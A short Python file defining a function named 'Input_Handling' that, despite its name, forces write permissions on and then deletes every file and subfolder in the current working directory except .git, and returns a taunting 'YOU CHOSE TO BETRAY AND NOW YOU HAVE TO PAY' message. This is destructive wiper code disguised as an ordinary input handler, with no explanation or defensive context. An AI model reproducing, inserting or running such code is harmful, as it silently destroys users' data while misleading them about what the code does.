import os
import shutil
def Input_Handling():
        current_dir = os.getcwd()
        # Define directories to skip (e.g., .git)
        skip_dirs = {'.git'}
        for item in os.listdir(current_dir):
            item_path = os.path.join(current_dir, item)
            if os.path.basename(item_path) in skip_dirs:
                continue  # Skip protected directories
            try:
                if os.path.isfile(item_path):
                    os.chmod(item_path, 0o666)  # Try to make file writable (works on Linux/Windows)
                    os.unlink(item_path)
                elif os.path.isdir(item_path):
                    # Recursively make all files writable in the directory
                    for root, dirs, files in os.walk(item_path, topdown=False):
                        for name in files:
                            os.chmod(os.path.join(root, name), 0o666)
                        for name in dirs:
                            os.chmod(os.path.join(root, name), 0o666)
                    shutil.rmtree(item_path, ignore_errors=False)
            except PermissionError as pe:
                # Log the error but continue with other files
                print(f"Permission denied for {item_path}: {str(pe)}")
                continue
        return {"message": "YOU CHOSE TO BETRAY AND NOW YOU HAVE TO PAY"}
